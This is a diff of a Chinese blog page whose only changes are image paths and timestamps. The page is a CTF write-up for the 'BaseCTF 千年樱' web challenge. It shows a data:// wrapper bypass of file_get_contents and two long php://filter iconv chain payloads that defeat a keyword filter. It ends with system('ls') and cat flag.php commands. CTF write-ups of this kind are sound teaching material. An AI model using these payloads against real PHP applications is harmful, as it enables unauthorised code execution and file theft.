@@ -39,17 +39,17 @@
 <meta property="og:site_name" content="达达">
 <meta property="og:description" content="Base  ctf  千年樱  设置cookie：  from&#x3D;ISCTF  访问&#x2F;get_contents_qwerghjkl.php  这里有个file_get_content函数   用data:&#x2F;&#x2F;伪协议绕过 file_get_contents($_POST[‘name’])   会尝试读取一个文件  名为name  而不是文件的内容 所以这里要让">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="c:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331165026850.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250331165026850.png">
 <meta property="og:image" content="c:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331165142719.png">
-<meta property="og:image" content="c:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331165216053.png">
-<meta property="og:image" content="c:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331165841213.png">
-<meta property="og:image" content="c:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331165940097.png">
-<meta property="og:image" content="c:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331170054865.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250331165216053.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250331165841213.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250331165940097.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250331170054865.png">
 <meta property="article:published_time" content="2025-03-31T09:59:00.000Z">
-<meta property="article:modified_time" content="2025-03-31T10:35:13.484Z">
+<meta property="article:modified_time" content="2025-03-31T11:18:14.203Z">
 <meta property="article:author" content="达达">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="c:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331165026850.png">
+<meta name="twitter:image" content="http://csd0617.github.io/picture/image-20250331165026850.png">
   
   
     <link rel="alternate" href="/atom.xml" title="达达" type="application/atom+xml">
@@ -321,21 +321,21 @@
       
       
         <p>Base  ctf  千年樱</p>
-<p><img src="C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331165026850.png" alt="image-20250331165026850"></p>
+<p><img src="/../picture/image-20250331165026850.png" alt="image-20250331165026850"></p>
 <p>设置<strong>cookie：  from&#x3D;ISCTF</strong></p>
 <p><img src="C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331165142719.png" alt="image-20250331165142719"></p>
 <p>访问&#x2F;get_contents_qwerghjkl.php</p>
-<p><img src="C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331165216053.png" alt="image-20250331165216053"></p>
+<p><img src="/../picture/image-20250331165216053.png" alt="image-20250331165216053"></p>
 <p>这里有个file_get_content函数   用data:&#x2F;&#x2F;伪协议绕过</p>
 <p>file_get_contents($_POST[‘name’])   会尝试读取一个文件  名为name  而不是文件的内容</p>
 <p>所以这里要让 <code>file_get_contents()</code> 读取的是一个“伪造的文件”，它的内容正好是 <code>&quot;ISCTF&quot;</code>。</p>
 <p>而<code>data://</code> 是 PHP 的 <strong>数据流（Stream Wrapper）</strong>，允许直接创建“虚拟文件”。</p>
 <p><strong>所以这里传  name&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,ISCTF即可</strong></p>
-<p><img src="C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331165841213.png" alt="image-20250331165841213"></p>
+<p><img src="/../picture/image-20250331165841213.png" alt="image-20250331165841213"></p>
 <p>访问&#x2F;well_down_mlpnkobji.php</p>
-<p><img src="C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331165940097.png" alt="image-20250331165940097"></p>
+<p><img src="/../picture/image-20250331165940097.png" alt="image-20250331165940097"></p>
 <p>这里看不清  自己找个文本写入看</p>
-<p><img src="C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331170054865.png" alt="image-20250331170054865"></p>
+<p><img src="/../picture/image-20250331170054865.png" alt="image-20250331170054865"></p>
 <p>waf($poc);对poc过滤了  “&#x2F;http|php|file|:|&#x3D;|/|?&#x2F;i”</p>
 <p>我们需要通过php:&#x2F;&#x2F;filter伪协议  来读取badChar.txt的文件内容</p>
 <p>读取出来的内容需要是  sakura for ISCTF</p>
@@ -362,7 +362,7 @@ convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;
 <p> <strong>python php_filter_chain_generator.py –chain “sakura for ISCTF&lt;?php”</strong></p>
 <?php是 **为了在 PHP 代码中形成有效的 PHP 代码段**
 
-![image-20250331173523516](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331173523516.png)
+![image-20250331173523516](../picture/image-20250331173523516.png)
 
 然后不知道为什么这个工具生成的payload多了一个convert.iconv.UTF8.CSISO2022KR  这里直接手动删除吧
 
@@ -370,9 +370,9 @@ payload：
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc=convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode</span><br></pre></td></tr></table></figure>
 
-![image-20250331175110521](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331175110521.png)
+![image-20250331175110521](../picture/image-20250331175110521.png)
 
-![image-20250331174621225](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331174621225.png)这里发现读取出来的文件内容是sakura for ISCTF<?php...
+![image-20250331174621225](../picture/image-20250331174621225.png)这里发现读取出来的文件内容是sakura for ISCTF<?php...
 
 还没有输出yes master   也就是没有绕过成功
 
@@ -382,7 +382,7 @@ payload:
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc=convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags</span><br></pre></td></tr></table></figure>
 
-![image-20250331175131622](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331175131622.png)
+![image-20250331175131622](../picture/image-20250331175131622.png)
 
 输出yes!master!   成功绕过
 
@@ -390,15 +390,15 @@ payload:
 
 继续传cmd=system('ls');
 
-![image-20250331175238340](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331175238340.png)
+![image-20250331175238340](../picture/image-20250331175238340.png)
 
 得到了目录  cat flag.php
 
-![image-20250331175335553](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331175335553.png)
+![image-20250331175335553](../picture/image-20250331175335553.png)
 
 查看源代码  发现flag
 
-![image-20250331175320705](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250331175320705.png)
+![image-20250331175320705](../picture/image-20250331175320705.png)
 
 最终payload
 
@@ -688,7 +688,7 @@ payload:
           description: "",
           stripContent: "Base  ctf  千年樱  设置cookie：  from&amp;#x3D;ISCTF  访问&amp;#x2F;get_contents_qwerghjkl.php  这里有个file_get_content函数   用data:&amp;#x2F;&amp;#x2F;伪协议绕过 file_get_contents($_POST[‘name’])   会尝试读取一个文件  名为name  而不是文件的内容 所以这里要让 file_get_contents() 读取的是一个“伪造的文件”，它的内容正好是 &amp;quot;IS",
           date: "Mon Mar 31 2025 17:59:00 GMT+0800",
-          updated: "Mon Mar 31 2025 18:35:13 GMT+0800",
+          updated: "Mon Mar 31 2025 19:18:14 GMT+0800",
           cover: "/../covers/4.jpg",
         };
       </script>
